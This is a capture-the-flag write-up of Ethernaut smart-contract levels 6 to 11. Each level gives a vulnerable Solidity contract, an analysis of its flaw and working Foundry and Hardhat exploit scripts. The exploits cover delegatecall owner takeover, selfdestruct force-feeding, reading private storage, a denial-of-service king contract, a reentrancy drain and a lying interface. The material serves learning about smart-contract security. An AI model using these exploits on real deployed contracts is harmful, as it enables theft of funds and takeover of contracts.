---
title: "Ethernaut Writeup - Part 2: Level 6-11"
published: 2026-09-15
category: "Blockchain"
tags: [Ethernaut, Solidity, Smart Contract Security, Blockchain]
draft: false
---

## Level 6 - Delegation

### Challenge Description
```
Usage of delegatecall is particularly risky and has been used as an attack vector on multiple historic hacks. With it, your contract is practically saying "here, -other contract- or -other library-, do whatever you want with my state". 
Delegates have complete access to your contract's state. The delegatecall function is a powerful feature, but a dangerous one, and must be used with extreme care.
```

### Challenge Contract

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Delegate {
    address public owner;

    constructor(address _owner) {
        owner = _owner;
    }

    function pwn() public {
        owner = msg.sender;
    }
}

contract Delegation {
    address public owner;
    Delegate delegate;

    constructor(address _delegateAddress) {
        delegate = Delegate(_delegateAddress);
        owner = msg.sender;
    }

    fallback() external {
        (bool result,) = address(delegate).delegatecall(msg.data);
        if (result) {
            this;
        }
    }
}
```

### Vulnerability Analysis
- **`delegatecall` context:** `delegatecall` allows one contract (A) to execute code from another contract (B), while the code runs in the **context and storage of contract A**. During execution, `msg.sender` and `msg.value` are preserved from the original caller.
- **Storage Layout Collision:**

  * In the `Delegate` contract, storage slot `0` stores the variable `address public owner`.
  * In the `Delegation` contract, storage slot `0` also stores the variable `address public owner`.
  * When the `pwn()` function from `Delegate` executes `owner = msg.sender;` through `delegatecall`, it writes the value to storage slot 0 of the calling contract (`Delegation`), not to the storage of the `Delegate` contract.

- The `Delegation` contract contains a `fallback` function that forwards any incoming `msg.data` to the `Delegate` contract using `delegatecall`:

```solidity
fallback() external {
    (bool result,) = address(delegate).delegatecall(msg.data);
    if (result) {
        this;
    }
}
```

- This means that if a caller sends calldata matching the `pwn()` function selector, the fallback function will execute `Delegate.pwn()` in the storage context of the `Delegation` contract.
- From there, the attacker can make the contract overwrite the `owner` variable in storage slot `0` with the attacker's own address.


### Exploitation / PoC

##### Foundry

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";

contract ExploitDelegationcSript is Script {
    function run(address contractAddress) public {
        uint256 Privatekey = vm.envUint("PRIVATE_KEY");
        address attacker = vm.addr(Privatekey);

        vm.startBroadcast(attacker);
        (bool success, ) = contractAddress.call(
            abi.encodeWithSignature("pwn()")
        );
        require(success, "Exploit Failed!");
        vm.stopBroadcast();
    }
}
```
##### Hardhat
```js
import { network } from "hardhat";
import "dotenv/config";

const { ethers } = await network.create();

async function main() {
	const instance = process.env.INSTANCE_ADDRESS;
	const [attacker] = await ethers.getSigners();
	const addressAttacker = await attacker.getAddress();

	// 4 byte selector	
	const selector_pwn = ethers.id("pwn()").slice(0, 10);

	const delegation = await ethers.getContractAt(
		["function owner() view returns (address)"],
		instance
	);

	const owner = await delegation.owner();
	console.log("Owner before exploit: ", owner);

	const tx = await attacker.sendTransaction({
		to: instance,
		data: selector_pwn
	});

	await tx.wait();

	const currentOwner = await delegation.owner();
	console.log("Current owner: ", currentOwner);
}

main().catch((error) => {
	console.log(error);
	process.exitCode = 1;
}
);

```

## Level 7 - Force

### Challenge Description
```
In solidity, for a contract to be able to receive ether, the fallback function must be marked payable.

However, there is no way to stop an attacker from sending ether to a contract by self destroying. Hence, it is important not to count on the invariant address(this).balance == 0 for any contract logic.
```

### Challenge Contract

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Force {
    /*

                   MEOW ?
         /\_/\   /
    ____/ o o \
  /~____  =ø= /
 (______)__m_m)

*/
}
```

### Vulnerability Analysis
- For a smart contract to receive ETH through regular transfers (`send`, `transfer`, or a value-carrying `call`), it must define either a `receive() external payable` function or a `fallback() external payable` function. The `Force` contract is completely empty, so any transaction that attempts to send ETH directly to it will automatically revert.
- In the EVM, the `SELFDESTRUCT` opcode (exposed in Solidity as `selfdestruct(address payable recipient)`) allows a contract to remove its bytecode from the state and transfer its entire remaining ETH balance to a specified address.


### Exploitation / PoC
#### Attack flow
1. Write and deploy the attack contract: Create a helper contract with a payable constructor or payable function to fund it with ETH, and include a `selfdestruct` call that targets the `Force` contract address.
2. **Fund and destroy the contract:** Deploy the attack contract with a small amount of Ether, such as `1 wei` or `0.0001 ETH`.
3. **Trigger `selfdestruct`:** When `selfdestruct` executes, the EVM transfers the entire ETH balance of the attack contract to the `Force` contract.

#### Exploit Code
- Create the attack contract :
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract ForceAttack {
    constructor(address payable target) payable {
        require(msg.value > 0, "Need more ETH");
        selfdestruct(target);
    }
}
```
##### Foundry

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "./ForceAttack.sol";

contract ExploitForceScript is Script {
    function run(address payable contractAddress) public {
        uint256 PrivateKey = vm.envUint("PRIVATE_KEY");
        address attacker = vm.addr(PrivateKey);

        vm.startBroadcast(attacker);
        new ForceAttack{value: 1 wei}(contractAddress);
        vm.stopBroadcast();
    }
}
```
##### Hardhat
```js
import { network } from "hardhat";
import "dotenv/config";

const { ethers } = await network.create();

async function main() {
	const instance = process.env.INSTANCE_ADDRESS;
	const [attack] = await ethers.getSigners();
	const attackerAdress = await attack.getAddress();

	const balanceBefore = await ethers.provider.getBalance(instance);
	console.log("balance before attack: ", balanceBefore);

	const ForceAttackFactory = await ethers.getContractFactory("ForceAttack");
	const ForceAttack = await ForceAttackFactory.deploy(instance, { value: ethers.parseEther("0.00001") });
	await ForceAttack.waitForDeployment();

	const balanceAfter = await ethers.provider.getBalance(instance);
	console.log("balance after attack: ", balanceAfter);
}

main().catch((error) => {
	console.error(error);
	process.exitCode = 1;
});
```

## Level 8 - Vault

### Challenge Description
```
It's important to remember that marking a variable as private only prevents other contracts from accessing it. State variables marked as private and local variables are still publicly accessible.

To ensure that data is private, it needs to be encrypted before being put onto the blockchain. In this scenario, the decryption key should never be sent on-chain, as it will then be visible to anyone who looks for it. zk-SNARKs provide a way to determine whether someone possesses a secret parameter, without ever having to reveal the parameter.
```

### Challenge Contract

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Vault {
    bool public locked;
    bytes32 private password;

    constructor(bytes32 _password) {
        locked = true;
        password = _password;
    }

    function unlock(bytes32 _password) public {
        if (password == _password) {
            locked = false;
        }
    }
}
```

### Vulnerability Analysis
- The `private` keyword only provides access control at the compiler level, preventing other smart contracts from directly accessing the variable or inheriting it. It does not provide any form of encryption or data hiding.
- Transparency of Ethereum State: All data stored on the blockchain is publicly accessible. The EVM organizes contract storage into 32-byte storage slots, indexed starting from `0`:

  * **Slot 0:** Stores the `bool public locked` variable, which occupies 1 byte, with the remaining 31 bytes unused.
  * **Slot 1:** Stores the `bytes32 private password` variable, which occupies the full 32-byte slot.
- Reading Storage Directly via the RPC API: Ethereum nodes provide the standard JSON-RPC method `eth_getStorageAt(address, slot)`, which allows anyone to directly read the raw value stored at any contract storage slot without requiring the contract to expose a getter function.

### Exploitation / PoC
#### Attack flow
1. Identify the Password Storage Slot: Based on the declaration order of the state variables, the `password` variable is stored independently in **slot 1**.
2. Read the Storage Value: Directly read storage **slot 1** to retrieve the bytes32 value of the password.
3. Unlock the Contract: Pass the extracted `password` value to the `unlock(bytes32 _password)` function.

#### Exploit Code
##### Foundry

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";

interface IVault {
    function locked() external view returns (bool);
    function unlock(bytes32 _password) external;
}
contract ExploitVaultScript is Script {
    function run(address contractAddress) public {
        uint256 PrivateKey = vm.envUint("PRIVATE_KEY");
        // address attacker = vm.addr(PrivateKey);

        IVault vault = IVault(contractAddress);
        console.log("Locked status before attack: ", vault.locked());

        bytes32 password = vm.load(contractAddress, bytes32(uint256(1)));

        vm.startBroadcast(PrivateKey);
        vault.unlock(password);
        vm.stopBroadcast();

        console.log("Locked status affter attack: ", vault.locked());
        require(!vault.locked(), "Exploit failed!");
    }
}
```
##### Hardhat
```js
import { network } from "hardhat";
import "dotenv/config";

const { ethers } = await network.create();

async function main() {
	const instance = process.env.INSTANCE_ADDRESS;
	const [attack] = await ethers.getSigners();

	const VaultABI = [
		"function locked() external view returns (bool)",
		"function unlock(bytes32 _password) external",
	]

	const vault = await ethers.getContractAt(VaultABI, instance, attack);
	const lockedBefore = await vault.locked();
	console.log("Locked status before attack: ", lockedBefore);

	const password = await ethers.provider.getStorage(instance, 1);

	const tx = await vault.unlock(password);
	await tx.wait();

	const lockedAfter = await vault.locked();
	console.log("Locked status after attack: ", lockedAfter);

	if (!lockedAfter) {
		console.log("Exploit success!");
	} else console.log("Exploit failed!");

}

main().catch((error) => {
	console.error(error);
	process.exitCode = 1;
});
```

## Level 9 - King

### Challenge Description
```
The contract below represents a very simple game: whoever sends it an amount of ether that is larger than the current prize becomes the new king. On such an event, the overthrown king gets paid the new prize, making a bit of ether in the process! As ponzi as it gets xD

Such a fun game. Your goal is to break it.

When you submit the instance back to the level, the level is going to reclaim kingship. You will beat the level if you can avoid such a self proclamation.
```

### Challenge Contract

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract King {
    address king;
    uint256 public prize;
    address public owner;

    constructor() payable {
        owner = msg.sender;
        king = msg.sender;
        prize = msg.value;
    }

    receive() external payable {
        require(msg.value >= prize || msg.sender == owner);
        payable(king).transfer(msg.value);
        king = msg.sender;
        prize = msg.value;
    }

    function _king() public view returns (address) {
        return king;
    }
}
```

### Vulnerability Analysis
- According to the challenge description, the goal is to become the new `king` of the contract and prevent anyone, including Ethernaut's Factory contract, from dethroning you after submitting the instance.
- The contract simulates a king-of-the-hill game with a Ponzi-like mechanism:

  * Anyone who sends an amount of ETH greater than or equal to the current `prize` becomes the new `king`.
  * The previous king is refunded using `transfer`:

    ```solidity
    payable(king).transfer(msg.value);
    ```

  * When the instance is submitted, Ethernaut attempts to reclaim the throne by sending a larger amount of ETH to verify whether the attacker can remain the `king` permanently.
- The contract directly sends ETH to the current `king` instead of using a pull-payment pattern.
- This creates a DoS vulnerability because `transfer` reverts if the receiver rejects the ETH. If the current `king` is a contract that cannot receive ETH or deliberately reverts, `payable(king).transfer(...)` will always fail.
- As a result, no one can become the new `king`, and the attacker keeps the throne permanently.

### Exploitation / PoC
#### Attack flow

1. Check the current `prize` to know how much ETH is required to become the new `king`.
2. Deploy an attack contract that sends enough ETH to the `King` contract and does not implement `receive()` or `fallback()`.
3. The attack contract becomes the new `king`.
4. When Ethernaut tries to take back the throne, `King` attempts to refund the attack contract using `transfer()`.
As a result, the attacker remains the `king` permanently.

#### Exploit Code
- Create the attack contract :
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;


contract KingAttack {
    address payable target;

    constructor(address payable KingAddress) {
        target = KingAddress;
    }

    function attack() public payable {
        (bool success, ) = target.call{value: msg.value}("");
        require(success, "Send ETH failed");
    }
}

```
##### Foundry

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "./KingAttack.sol";

interface IKing {
    function prize() external view returns (uint256);
    function _king() external view returns (address);
}

contract ExploitKingScript is Script {
    function run(address payable contractAddress) public {
        uint256 PrivateKey = vm.envUint("PRIVATE_KEY");

        uint256 currentPrize = IKing(contractAddress).prize();
        console.log("owner before attack: ", IKing(contractAddress)._king());

        vm.startBroadcast(PrivateKey);
        KingAttack kingAttack = new KingAttack(contractAddress);
        kingAttack.attack{value: currentPrize}();
        vm.stopBroadcast();
        console.log("owner after attack: ", IKing(contractAddress)._king());
    }
}
```
##### Hardhat
```js
import { network } from "hardhat";
import "dotenv/config";

const { ethers } = await network.create();

async function main() {
	const instance = process.env.INSTANCE_ADDRESS;
	const [attack] = await ethers.getSigners();

	const KingABI = [
		"function prize() public view returns (uint256)",
		"function _king() public view returns (address)",
	];

	const King = await ethers.getContractAt(KingABI, instance, attack);

	const KingAttackFactory = await ethers.getContractFactory("KingAttack", attack);
	const KingAttack = await KingAttackFactory.deploy(instance);
	await KingAttack.waitForDeployment();

	const currentPrize = await King.prize();
	console.log("owner before: ", await King._king());

	const tx = await KingAttack.attack({ value: currentPrize });
	await tx.wait();

	console.log("owner after: ", await King._king());

}

main().catch((error) => {
	console.error(error);
	process.exitCode = 1;
});
```

## Level 10 - Re-entrancy

### Challenge Description
```
In order to prevent re-entrancy attacks when moving funds out of your contract, use the Checks-Effects-Interactions pattern being aware that call will only return false without interrupting the execution flow. Solutions such as ReentrancyGuard or PullPayment can also be used.

transfer and send are no longer recommended solutions as they can potentially break contracts after the Istanbul hard fork Source 1 Source 2.

Always assume that the receiver of the funds you are sending can be another contract, not just a regular address. Hence, it can execute code in its payable fallback method and re-enter your contract, possibly messing up your state/logic.

Re-entrancy is a common attack. You should always be prepared for it!
```

### Challenge Contract

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.12;

import "openzeppelin-contracts-06/math/SafeMath.sol";

contract Reentrance {
    using SafeMath for uint256;

    mapping(address => uint256) public balances;

    function donate(address _to) public payable {
        balances[_to] = balances[_to].add(msg.value);
    }

    function balanceOf(address _who) public view returns (uint256 balance) {
        return balances[_who];
    }

    function withdraw(uint256 _amount) public {
        if (balances[msg.sender] >= _amount) {
            (bool result,) = msg.sender.call{value: _amount}("");
            if (result) {
                _amount;
            }
            balances[msg.sender] -= _amount;
        }
    }

    receive() external payable {}
}
```

### Vulnerability Analysis
- Contract Mechanism:
  - Users can deposit ETH into the contract through `donate(address _to)`, which adds funds to the balance of a specified address.

  * Users can withdraw their funds by calling `withdraw(uint _amount)`.
- The `withdraw(uint _amount)` function first checks whether the caller has enough balance. It then sends ETH to `msg.sender` using a low-level `call`.
- Only after the external call finishes does the contract reduce the caller's balance:
```solidity
balances[msg.sender] -= _amount;
```
- This order is unsafe because the receiver can execute code before its balance is updated.
- When `call{value: ...}` sends ETH to an external contract, it can trigger that contract's `receive()` or `fallback()` function. An attacker can use this function to call `withdraw()` again before the previous withdrawal finishes, creating a **reentrancy attack**.
- Because `balances[msg.sender]` has not been reduced yet, the condition `balances[msg.sender] >= _amount` remains true during the reentrant call.

- This allows the attacker to repeatedly call `withdraw()` and drain the contract's ETH balance.


### Exploitation / PoC
#### Attack flow
1. The attack contract first calls `donate()` and deposits a small amount of ETH to its own address.
2. It then calls `withdraw()` with the same amount.
3. When `Reentrance` sends ETH back, the attack contract's `receive()` function is triggered.
4. Before the balance is updated, `receive()` calls `withdraw()` again.
5. This process repeats until the `Reentrance` contract is drained.

#### Exploit Code
- Create the attack contract :
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/console.sol";

interface IReentrance {
    function donate(address _to) external payable;
    function balanceOf(address _to) external view returns (uint256);
    function withdraw(uint256 _amount) external;
}

contract ReentranceAttack {
    address payable target;
    uint256 public initDeposit;

    constructor(address payable _target) {
        target = _target;
    }

    function attack() public payable {
        initDeposit = msg.value;
        IReentrance(target).donate{value: initDeposit}(address(this));
        console.log(
            "balance of attacker before attack: ",
            IReentrance(target).balanceOf(address(this))
        );
        IReentrance(target).withdraw(initDeposit);
    }
    receive() external payable {
        uint256 targetBalance = target.balance;
        if (targetBalance >= initDeposit) {
            IReentrance(target).withdraw(initDeposit);
        } else if (targetBalance > 0) {
            IReentrance(target).withdraw(targetBalance);
        }
    }

    function sendToAttack() public {
        console.log("Current balance of target after attack: ", target.balance);
        console.log(
            "balance of attacker after attack: ",
            address(this).balance
        );
        payable(msg.sender).transfer(address(this).balance);
    }
}
```
##### Foundry

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "./ReentranceAttack.sol";

contract ExploitReEntrancyScript is Script {
    function run(address payable contractAddress) public {
        uint256 PrivateKey = vm.envUint("PRIVATE_KEY");
        vm.startBroadcast(PrivateKey);
        ReentranceAttack attackContract = new ReentranceAttack(contractAddress);
        attackContract.attack{value: 0.001 ether}();
        attackContract.sendToAttack();
        vm.stopBroadcast();
    }
}
```
##### Hardhat
```js
import { network } from "hardhat";
import "dotenv/config";

const { ethers } = await network.create();

async function main() {
	const instance = process.env.INSTANCE_ADDRESS;
	const [attack] = await ethers.getSigners();

	const ReentranceAttackFactory = await ethers.getContractFactory("ReentranceAttack", attack);
	const ReentranceAttack = await ReentranceAttackFactory.deploy(instance);
	await ReentranceAttack.waitForDeployment();

	const tx1 = await ReentranceAttack.attack({ value: ethers.parseEther("0.001") });
	await tx1.wait();

	const tx2 = await ReentranceAttack.sendToAttack();
	await tx2.wait();
}

main().catch((error) => {
	console.error(error);
	process.exitCode = 1;
})
```

## Level 11 - Elevator

### Challenge Description
```
This elevator won't let you reach the top of your building. Right?

Things that might help:
Sometimes solidity is not good at keeping promises.
This Elevator expects to be used from a Building.
```

### Challenge Contract

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Building {
    function isLastFloor(uint256) external returns (bool);
}

contract Elevator {
    bool public top;
    uint256 public floor;

    function goTo(uint256 _floor) public {
        Building building = Building(msg.sender);

        if (!building.isLastFloor(_floor)) {
            floor = _floor;
            top = building.isLastFloor(floor);
        }
    }
}
```

### Vulnerability Analysis
- The goal is to take elevator to the top floor by making the `top` variable in `Elevator` contract become `true`
- The `Elevator` contract allows users to move to any floor by calling the `goTo(uint _floor)` function
- Instead of checking the top floor by itself, the `Elevator` contract relies on the caller (`msg.sender`) through the `Building` interface:

```solidity
function goTo(uint _floor) public {
    Building building = Building(msg.sender);

    if (!building.isLastFloor(_floor)) {
        floor = _floor;
        top = building.isLastFloor(_floor);
    }
}
```
- In the `Building` interface, `isLastFloor()` is not marked as `view` or `pure`. This means the function can modify its internal state and return different values on each call.
- `Elevator` trusts `msg.sender` as a valid `Building`, but a malicious caller can control the return value of `isLastFloor()`.
- This means the caller controls the result of `isLastFloor()`.


### Exploitation / PoC
#### Attack Flow

1. Create an attack contract that implements `isLastFloor(uint)`.
2. Make the function return `false` on the first call and `true` on the second call.
3. Call `goTo()` from the attack contract.

The first call passes the `if` check, while the second call sets `top = true`.

#### Exploit Code
- Create the attack contract :
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IElevator {
    function goTo(uint256 _floor) external;
}

contract ElevatorAttack {
    address target;
    constructor(address _target) {
        target = _target;
    }
    uint256 count = 0;
    function attack() public {
        IElevator(target).goTo(count);
    }

    function isLastFloor(uint256) external returns (bool) {
        count++;
        if (count == 1) {
            return false;
        } else if (count == 2) {
            return true;
        }
    }
}
```
##### Foundry

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "./ElevatorAttack.sol";

contract ExploitElevatorAttack is Script {
    function run(address contractAddress) public {
        uint256 PrivateKey = vm.envUint("PRIVATE_KEY");
        vm.startBroadcast(PrivateKey);
        ElevatorAttack elevatorAttack = new ElevatorAttack(contractAddress);
        elevatorAttack.attack();
        vm.stopBroadcast();
    }
}
```
##### Hardhat
```js
import { network } from "hardhat";
import "dotenv/config";

const { ethers } = await network.create();

async function main() {
	const instance = process.env.INSTANCE_ADDRESS;
	const [attack] = await ethers.getSigners();

	const ElevatorAttackABI = [
		"funtion attack() public",
	];

	const ElevatorAttackFactory = await ethers.getContractFactory("ElevatorAttack", attack);
	const ElevatorAttack = await ElevatorAttackFactory.deploy(instance);
	await ElevatorAttack.waitForDeployment();

	const tx = await ElevatorAttack.attack();
	await tx.wait();
}
main().catch((error) => {
	console.error(error);
	process.exitCode = 1;
});
```
